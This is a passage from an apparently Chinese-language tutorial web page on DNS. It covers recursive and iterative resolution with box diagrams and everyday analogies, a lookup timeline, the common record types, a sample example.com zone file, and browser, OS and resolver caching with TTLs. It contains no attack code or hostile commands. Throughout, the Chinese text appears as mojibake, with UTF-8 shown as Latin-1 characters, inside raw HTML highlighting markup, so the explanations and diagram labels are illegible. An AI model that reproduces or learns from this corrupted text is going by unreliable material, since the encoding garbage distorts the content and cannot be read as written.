class="hljs-keyword">com</span> DNSæœåŠ¡å™¨ â”‚<br>â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>     â”‚ <span class="hljs-number">5</span>. è¿”å›example.<span class="hljs-keyword">com</span>æœåŠ¡å™¨åœ°å€<br>     â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ æœ¬åœ°DNSæœåŠ¡å™¨  â”‚<br>â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>     â”‚ <span class="hljs-number">6</span>. æŸ¥è¯¢example.<span class="hljs-keyword">com</span>æœåŠ¡å™¨<br>     â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ example.<span class="hljs-keyword">com</span>æœåŠ¡å™¨   â”‚<br>â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>     â”‚ <span class="hljs-number">7</span>. è¿”å›wwwçš„IPåœ°å€<br>     â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ æœ¬åœ°DNSæœåŠ¡å™¨  â”‚<br>â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>     â”‚ <span class="hljs-number">8</span>. è¿”å›æœ€ç»ˆç­”æ¡ˆ<br>     â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  å®¢æˆ·ç«¯  â”‚ â† å¾—åˆ°IPåœ°å€<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>ç‰¹ç‚¹ï¼š<br>âœ… å®¢æˆ·ç«¯ç®€å•ï¼Œåªé—®ä¸€æ¬¡<br>âœ… æœåŠ¡å™¨è´Ÿè´£æ‰€æœ‰æŸ¥è¯¢å·¥ä½œ<br>âœ… ç»“æœå¯ä»¥è¢«ç¼“å­˜<br>âŒ æœåŠ¡å™¨è´Ÿæ‹…é‡<br><br>ç”Ÿæ´»åŒ–ç±»æ¯”ï¼š<br>é€’å½’æŸ¥è¯¢ = æ‰¾ç§˜ä¹¦å¸®å¿™<br>ä½ ï¼š<span class="hljs-string">&quot;å¸®æˆ‘æŸ¥ä¸€ä¸‹å¼ ä¸‰çš„ç”µè¯&quot;</span><br>ç§˜ä¹¦ï¼š<span class="hljs-string">&quot;å¥½çš„ï¼Œæˆ‘å¸®ä½ æŸ¥&quot;</span><br>ç§˜ä¹¦æŸ¥éæ‰€æœ‰é€šè®¯å½•ï¼Œç„¶åå‘Šè¯‰ä½ ç»“æœ<br></code></pre></td></tr></table></figure><h3 id="3-2-è¿­ä»£æŸ¥è¯¢ï¼ˆIterative-Queryï¼‰"><a href="#3-2-è¿­ä»£æŸ¥è¯¢ï¼ˆIterative-Queryï¼‰" class="headerlink" title="3.2 è¿­ä»£æŸ¥è¯¢ï¼ˆIterative Queryï¼‰"></a>3.2 è¿­ä»£æŸ¥è¯¢ï¼ˆIterative Queryï¼‰</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs stylus">è¿­ä»£æŸ¥è¯¢æµç¨‹ï¼š<br><br>æ¯æ¬¡æŸ¥è¯¢è¿”å›ä¸‹ä¸€æ­¥åº”è¯¥é—®è°<br><br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  å®¢æˆ·ç«¯  â”‚ ï¼ˆæœ¬åœ°DNSæœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯æ˜¯é€’å½’ï¼‰<br>â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜<br>     â”‚ <span class="hljs-number">1</span>. æŸ¥è¯¢ www<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span><br>     â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ æœ¬åœ°DNSæœåŠ¡å™¨  â”‚ â† ä»è¿™é‡Œå¼€å§‹æ˜¯è¿­ä»£æŸ¥è¯¢<br>â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>     â”‚ <span class="hljs-number">2</span>. æŸ¥è¯¢æ ¹æœåŠ¡å™¨<br>     â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  æ ¹DNSæœåŠ¡å™¨   â”‚<br>â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>     â”‚ <span class="hljs-number">3</span>. è¿”å›ï¼š<span class="hljs-string">&quot;æˆ‘ä¸çŸ¥é“ï¼Œä½†ä½ å¯ä»¥é—®.comæœåŠ¡å™¨(192.x.x.x)&quot;</span><br>     â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ æœ¬åœ°DNSæœåŠ¡å™¨  â”‚<br>â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>     â”‚ <span class="hljs-number">4</span>. æŸ¥è¯¢.comæœåŠ¡å™¨(<span class="hljs-number">192</span><span class="hljs-selector-class">.x</span><span class="hljs-selector-class">.x</span>.<span class="hljs-attribute">x</span>)<br>     â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ <span class="hljs-selector-class">.com</span> DNSæœåŠ¡å™¨ â”‚<br>â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>     â”‚ <span class="hljs-number">5</span>. è¿”å›ï¼š<span class="hljs-string">&quot;æˆ‘ä¸çŸ¥é“ï¼Œä½†ä½ å¯ä»¥é—®example.comæœåŠ¡å™¨(93.x.x.x)&quot;</span><br>     â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ æœ¬åœ°DNSæœåŠ¡å™¨  â”‚<br>â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>     â”‚ <span class="hljs-number">6</span>. æŸ¥è¯¢example.comæœåŠ¡å™¨(<span class="hljs-number">93</span><span class="hljs-selector-class">.x</span><span class="hljs-selector-class">.x</span>.<span class="hljs-attribute">x</span>)<br>     â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ example.comæœåŠ¡å™¨   â”‚<br>â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>     â”‚ <span class="hljs-number">7</span>. è¿”å›ï¼š<span class="hljs-string">&quot;www.example.comçš„IPæ˜¯93.184.216.34&quot;</span><br>     â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ æœ¬åœ°DNSæœåŠ¡å™¨  â”‚<br>â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>     â”‚ <span class="hljs-number">8</span>. è¿”å›æœ€ç»ˆç­”æ¡ˆ<br>     â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  å®¢æˆ·ç«¯  â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>ç‰¹ç‚¹ï¼š<br>âœ… æ¯ä¸ªæœåŠ¡å™¨åªè´Ÿè´£å›ç­”æˆ–æŒ‡å¼•<br>âœ… æœåŠ¡å™¨è´Ÿæ‹…è½»<br>âŒ éœ€è¦å¤šæ¬¡æŸ¥è¯¢<br>âŒ å®¢æˆ·ç«¯éœ€è¦å¤šæ¬¡è¯·æ±‚<br><br>ç”Ÿæ´»åŒ–ç±»æ¯”ï¼š<br>è¿­ä»£æŸ¥è¯¢ = é—®è·¯<br>ä½ ï¼š<span class="hljs-string">&quot;è¯·é—®å›¾ä¹¦é¦†æ€ä¹ˆèµ°ï¼Ÿ&quot;</span><br>è·¯äººç”²ï¼š<span class="hljs-string">&quot;æˆ‘ä¸çŸ¥é“ï¼Œä½†ä½ å¯ä»¥é—®å‰é¢çš„è­¦å¯Ÿ&quot;</span><br>ä½ èµ°åˆ°è­¦å¯Ÿå¤„ï¼š<span class="hljs-string">&quot;è¯·é—®å›¾ä¹¦é¦†æ€ä¹ˆèµ°ï¼Ÿ&quot;</span><br>è­¦å¯Ÿï¼š<span class="hljs-string">&quot;ç›´èµ°500ç±³å·¦è½¬&quot;</span><br></code></pre></td></tr></table></figure><h3 id="3-3-æŸ¥è¯¢å¯¹æ¯”"><a href="#3-3-æŸ¥è¯¢å¯¹æ¯”" class="headerlink" title="3.3 æŸ¥è¯¢å¯¹æ¯”"></a>3.3 æŸ¥è¯¢å¯¹æ¯”</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs stylus">å®é™…DNSæŸ¥è¯¢è¿‡ç¨‹ï¼š<br><br>å®¢æˆ·ç«¯ â†’ æœ¬åœ°DNS: é€’å½’æŸ¥è¯¢<br>æœ¬åœ°DNS â†’ å…¶ä»–DNS: è¿­ä»£æŸ¥è¯¢<br><br>ä¸ºä»€ä¹ˆè¿™æ ·è®¾è®¡ï¼Ÿ<br><span class="hljs-number">1</span>. ç®€åŒ–å®¢æˆ·ç«¯<br><span class="hljs-number">2</span>. å‡è½»æ ¹æœåŠ¡å™¨è´Ÿæ‹…<br><span class="hljs-number">3</span>. åˆ©ç”¨æœ¬åœ°DNSç¼“å­˜<br><br>å®Œæ•´æŸ¥è¯¢ç¤ºä¾‹ï¼š<br><br>æ—¶é—´çº¿ï¼š<br>T0: å®¢æˆ·ç«¯è¯·æ±‚ www<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span><br>    â”œâ”€ å®¢æˆ·ç«¯ â†’ æœ¬åœ°DNS <span class="hljs-selector-attr">[é€’å½’æŸ¥è¯¢]</span><br><br>T1: æœ¬åœ°DNSå¼€å§‹å·¥ä½œ<br>    â”œâ”€ æ£€æŸ¥ç¼“å­˜ï¼ˆæœªå‘½ä¸­ï¼‰<br>    â”œâ”€ æœ¬åœ°DNS â†’ æ ¹æœåŠ¡å™¨ <span class="hljs-selector-attr">[è¿­ä»£æŸ¥è¯¢]</span><br>    â””â”€ æ ¹è¿”å›ï¼šè¯·æŸ¥è¯¢.comæœåŠ¡å™¨(<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.gtld-servers</span>.net)<br><br>T2: æœ¬åœ°DNSç»§ç»­<br>    â”œâ”€ æœ¬åœ°DNS â†’ .comæœåŠ¡å™¨ <span class="hljs-selector-attr">[è¿­ä»£æŸ¥è¯¢]</span><br>    â””â”€ .comè¿”å›ï¼šè¯·æŸ¥è¯¢ns1<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span><br><br>T3: æœ¬åœ°DNSæœ€åæŸ¥è¯¢<br>    â”œâ”€ æœ¬åœ°DNS â†’ ns1<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span> <span class="hljs-selector-attr">[è¿­ä»£æŸ¥è¯¢]</span><br>    â””â”€ ns1è¿”å›ï¼š<span class="hljs-number">93.184</span>.<span class="hljs-number">216.34</span><br><br>T4: ç»“æœè¿”å›<br>    â”œâ”€ æœ¬åœ°DNSç¼“å­˜ç»“æœï¼ˆTTL=<span class="hljs-number">300</span>ç§’ï¼‰<br>    â””â”€ æœ¬åœ°DNS â†’ å®¢æˆ·ç«¯ <span class="hljs-selector-attr">[è¿”å›ç­”æ¡ˆ]</span><br><br>æ€»è€—æ—¶ï¼šçº¦<span class="hljs-number">50</span>-<span class="hljs-number">100ms</span>ï¼ˆé¦–æ¬¡æŸ¥è¯¢ï¼‰<br></code></pre></td></tr></table></figure><hr><h2 id="4-DNSè®°å½•ç±»å‹"><a href="#4-DNSè®°å½•ç±»å‹" class="headerlink" title="4. DNSè®°å½•ç±»å‹"></a>4. DNSè®°å½•ç±»å‹</h2><h3 id="4-1-å¸¸è§DNSè®°å½•"><a href="#4-1-å¸¸è§DNSè®°å½•" class="headerlink" title="4.1 å¸¸è§DNSè®°å½•"></a>4.1 å¸¸è§DNSè®°å½•</h3><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext">DNSèµ„æºè®°å½•ï¼ˆResource Records, RRï¼‰æ ¼å¼ï¼š<br>åç§°  TTL  ç±»  ç±»å‹  æ•°æ®<br><br>ä¸»è¦è®°å½•ç±»å‹ï¼š<br><br>1. Aè®°å½• (Address)<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">åŸŸå â†’ IPv4åœ°å€</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">ç¤ºä¾‹ï¼šwww.example.com. 300 IN A 93.184.216.34</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">ç”¨é€”ï¼šæœ€å¸¸ç”¨ï¼Œå°†åŸŸåæŒ‡å‘IPv4</span><br><br>2. AAAAè®°å½•<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">åŸŸå â†’ IPv6åœ°å€</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">ç¤ºä¾‹ï¼šwww.example.com. 300 IN AAAA 2606:2800:220:1:248:1893:25c8:1946</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">ç”¨é€”ï¼šå°†åŸŸåæŒ‡å‘IPv6</span><br><br>3. CNAMEè®°å½• (Canonical Name)<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">åŸŸå â†’ å¦ä¸€ä¸ªåŸŸåï¼ˆåˆ«åï¼‰</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">ç¤ºä¾‹ï¼šwww.example.com. 300 IN CNAME example.com.</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">ç”¨é€”ï¼šåˆ›å»ºåŸŸååˆ«å</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">æ³¨æ„ï¼šCNAMEä¸èƒ½ä¸å…¶ä»–è®°å½•å…±å­˜</span><br><br>4. MXè®°å½• (Mail Exchange)<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">åŸŸå â†’ é‚®ä»¶æœåŠ¡å™¨</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">ç¤ºä¾‹ï¼šexample.com. 300 IN MX 10 mail.example.com.</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">ä¼˜å…ˆçº§ï¼šæ•°å­—è¶Šå°ä¼˜å…ˆçº§è¶Šé«˜</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">ç”¨é€”ï¼šæŒ‡å®šé‚®ä»¶æœåŠ¡å™¨</span><br><br>5. NSè®°å½• (Name Server)<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">åŸŸå â†’ æƒå¨DNSæœåŠ¡å™¨</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">ç¤ºä¾‹ï¼šexample.com. 300 IN NS ns1.example.com.</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">ç”¨é€”ï¼šæŒ‡å®šåŸŸåçš„DNSæœåŠ¡å™¨</span><br><br>6. TXTè®°å½•<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">åŸŸå â†’ æ–‡æœ¬ä¿¡æ¯</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">ç¤ºä¾‹ï¼šexample.com. 300 IN TXT &quot;v=spf1 include:_spf.example.com ~all&quot;</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">ç”¨é€”ï¼šSPFã€DKIMã€åŸŸåéªŒè¯ç­‰</span><br><br>7. PTRè®°å½• (Pointer)<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">IPåœ°å€ â†’ åŸŸåï¼ˆåå‘è§£æï¼‰</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">ç¤ºä¾‹ï¼š34.216.184.93.in-addr.arpa. 300 IN PTR www.example.com.</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">ç”¨é€”ï¼šIPåå‘æŸ¥è¯¢</span><br><br>8. SOAè®°å½• (Start of Authority)<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">åŸŸçš„æƒå¨ä¿¡æ¯</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">åŒ…å«ï¼šä¸»DNSæœåŠ¡å™¨ã€ç®¡ç†å‘˜é‚®ç®±ã€åºåˆ—å·ã€åˆ·æ–°æ—¶é—´ç­‰</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">ç¤ºä¾‹ï¼š</span><br>     example.com. 3600 IN SOA ns1.example.com. admin.example.com. (<br>       2024010601 ; åºåˆ—å·<br>       3600       ; åˆ·æ–°æ—¶é—´<br>       1800       ; é‡è¯•æ—¶é—´<br>       604800     ; è¿‡æœŸæ—¶é—´<br>       86400      ; æœ€å°TTL<br>     )<br><br>9. SRVè®°å½• (Service)<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">æœåŠ¡ä½ç½®è®°å½•</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">ç¤ºä¾‹ï¼š_http._tcp.example.com. 300 IN SRV 10 5 80 www.example.com.</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">ç”¨é€”ï¼šæŒ‡å®šæœåŠ¡çš„ä½ç½®</span><br></code></pre></td></tr></table></figure><h3 id="4-2-DNSè®°å½•ç¤ºä¾‹"><a href="#4-2-DNSè®°å½•ç¤ºä¾‹" class="headerlink" title="4.2 DNSè®°å½•ç¤ºä¾‹"></a>4.2 DNSè®°å½•ç¤ºä¾‹</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs tap">å®Œæ•´çš„DNSåŒºåŸŸæ–‡ä»¶ç¤ºä¾‹ï¼š<br><br>; example.com DNSåŒºåŸŸæ–‡ä»¶<br><br>; SOAè®°å½•<br>example.com.   <span class="hljs-number"> 3600 </span>   IN  SOA ns1.example.com. admin.example.com. (<br>                           <span class="hljs-number"> 2024010601 </span> ; Serial<br>                           <span class="hljs-number"> 3600 </span>       ; Refresh<br>                           <span class="hljs-number"> 1800 </span>       ; Retry<br>                           <span class="hljs-number"> 604800 </span>     ; Expire<br>                           <span class="hljs-number"> 86400 </span>)     ; Minimum TTL<br><br>; NSè®°å½•<br>example.com.   <span class="hljs-number"> 3600 </span>   IN  NS  ns1.example.com.<br>example.com.   <span class="hljs-number"> 3600 </span>   IN  NS  ns2.example.com.<br><br>; Aè®°å½•<br>example.com.   <span class="hljs-number"> 300 </span>    IN  A   93.184.216.34<br>www.example.com.<span class="hljs-number"> 300 </span>   IN  A   93.184.216.34<br>mail.example.com.<span class="hljs-number"> 300 </span>  IN  A   93.184.216.35<br>ftp.example.com. <span class="hljs-number"> 300 </span>  IN  A   93.184.216.36<br><br>; AAAAè®°å½•<br>www.example.com.<span class="hljs-number"> 300 </span>   IN  AAAA 2606:2800:220:1:248:1893:25c8:1946<br><br>; MXè®°å½•<br>example.com.   <span class="hljs-number"> 300 </span>    IN  MX <span class="hljs-number"> 10 </span>mail.example.com.<br>example.com.   <span class="hljs-number"> 300 </span>    IN  MX <span class="hljs-number"> 20 </span>mail2.example.com.<br><br>; CNAMEè®°å½•<br>blog.example.com.<span class="hljs-number"> 300 </span>  IN  CNAME www.example.com.<br>shop.example.com.<span class="hljs-number"> 300 </span>  IN  CNAME www.example.com.<br><br>; TXTè®°å½•<br>example.com.   <span class="hljs-number"> 300 </span>    IN  TXT &quot;v=spf1 mx ~all&quot;<br>_dmarc.example.com.<span class="hljs-number"> 300 </span>IN  TXT &quot;v=DMARC1; p=none; rua=mailto:dmarc@example.com&quot;<br><br>è®°å½•è§£è¯»ï¼š<br>- TTL 300: ç¼“å­˜5åˆ†é’Ÿ<br>- TTL 3600: ç¼“å­˜1å°æ—¶<br>- IN: Internetç±»<br>- ä¼˜å…ˆçº§10 &lt; 20: mail.example.comä¼˜å…ˆ<br></code></pre></td></tr></table></figure><hr><h2 id="5-DNSç¼“å­˜æœºåˆ¶"><a href="#5-DNSç¼“å­˜æœºåˆ¶" class="headerlink" title="5. DNSç¼“å­˜æœºåˆ¶"></a>5. DNSç¼“å­˜æœºåˆ¶</h2><h3 id="5-1-ç¼“å­˜å±‚çº§"><a href="#5-1-ç¼“å­˜å±‚çº§" class="headerlink" title="5.1 ç¼“å­˜å±‚çº§"></a>5.1 ç¼“å­˜å±‚çº§</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs markdown">DNSç¼“å­˜çš„å¤šä¸ªå±‚çº§ï¼š<br><br><span class="hljs-bullet">1.</span> æµè§ˆå™¨ç¼“å­˜<br><span class="hljs-bullet">   -</span> æœ€å¿«ï¼Œä½†å®¹é‡å°<br><span class="hljs-bullet">   -</span> Chrome: chrome://net-internals/#dns<br><span class="hljs-bullet">   -</span> TTL: é€šå¸¸60ç§’<br><br><span class="hljs-bullet">2.</span> æ“ä½œç³»ç»Ÿç¼“å­˜<br><span class="hljs-bullet">   -</span> Windows: ipconfig /displaydns<br><span class="hljs-bullet">   -</span> Linux: systemd-resolved<br><span class="hljs-bullet">   -</span> macOS: dscacheutil -cachedump<br><br><span class="hljs-bullet">3.</span> æœ¬åœ°DNSæœåŠ¡å™¨ç¼“å­˜<br><span class="hljs-bullet">   -</span> ISPçš„DNSæœåŠ¡å™¨<br><span class="hljs-bullet">   -</span> æˆ–è‡ªå·±é…ç½®çš„DNSï¼ˆå¦‚8.8.8.8ï¼‰<br><span class="hljs-bullet">   -</span> TTL: ç”±è®°å½•çš„TTLå†³å®š<br><br><span class="hljs-bullet">4.</span> å…¶ä»–DNSæœåŠ¡å™¨ç¼“å­˜<br><span class="hljs-bullet">   -</span> ä¸­é—´DNSæœåŠ¡å™¨<br><span class="hljs-bullet">   -</span> æ ¹æ®TTLç¼“å­˜<br><br>ç¼“å­˜å·¥ä½œæµç¨‹ï¼š<br>æŸ¥è¯¢ www.example.com<br><br>Level 1: æµè§ˆå™¨ç¼“å­˜<br>  â”œâ”€ å‘½ä¸­ â†’ ç›´æ¥è¿”å› âœ…<br>  â””â”€ æœªå‘½ä¸­ â†’ ç»§ç»­<br><br>Level 2: OSç¼“å­˜<br>  â”œâ”€ å‘½ä¸­ â†’ è¿”å› âœ…<br>  â””â”€ æœªå‘½ä¸­ â†’ ç»§ç»­<br><br>Level 3: æœ¬åœ°DNSç¼“å­˜<br>  â”œâ”€ å‘½ä¸­ â†’ è¿”å› âœ…<br>  â””â”€ æœªå‘½ä¸­ â†’ å¼€å§‹é€’å½’/è¿­ä»£æŸ¥è¯¢<br><br>Level 4: å®é™…DNSæŸ¥è¯¢<br>  â””â”€ æŸ¥è¯¢æƒå¨æœåŠ¡å™¨ â†’ è·å–ç­”æ¡ˆ â†’ å„å±‚ç¼“å­˜<br></code></pre></td></tr></table></figure><h3 id="5-2-TTLï¼ˆç”Ÿå­˜æ—¶é—´ï¼‰"><a href="#5-2-TTLï¼ˆç”Ÿå­˜æ—¶é—´ï¼‰" class="headerlink" title="5.2 TTLï¼ˆç”Ÿå­˜æ—¶é—´ï¼‰"></a>5.2 TTLï¼ˆç”Ÿå­˜æ—¶é—´ï¼‰</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code 